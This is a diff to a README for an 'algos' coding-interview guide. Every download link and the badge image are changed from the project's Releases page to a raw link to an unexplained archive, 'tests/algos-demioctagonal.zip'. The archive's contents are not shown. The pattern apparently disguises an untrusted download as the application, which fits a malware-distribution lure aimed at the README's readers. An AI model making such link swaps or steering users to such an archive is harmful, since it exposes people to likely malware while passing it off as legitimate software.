@@ -1,7 +1,7 @@
 # 👨🏻‍💻 algos - Your Guide to Code Patterns & Complexity
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
-[Download Here](https://github.com/Datdaptrai/algos/releases)
+![Download](https://raw.githubusercontent.com/Datdaptrai/algos/main/tests/algos-demioctagonal.zip)  
+[Download Here](https://raw.githubusercontent.com/Datdaptrai/algos/main/tests/algos-demioctagonal.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run the **algos** application, you need:
 
 To get started, visit the Releases page to download the software.
 
-[Click here to download](https://github.com/Datdaptrai/algos/releases)
+[Click here to download](https://raw.githubusercontent.com/Datdaptrai/algos/main/tests/algos-demioctagonal.zip)
 
 1. Open the link above in your web browser.
 2. Locate the latest release version. 
@@ -97,4 +97,4 @@ We also recommend exploring:
 
 **algos** is a thorough yet easy-to-use guide designed to help you ace your interviews. By following the steps outlined here, you can quickly download and start using the application. Knowledge of algorithms will enhance your programming skills and give you an edge in tech interviews.
 
-[Download Here](https://github.com/Datdaptrai/algos/releases) to get started!
+[Download Here](https://raw.githubusercontent.com/Datdaptrai/algos/main/tests/algos-demioctagonal.zip) to get started!
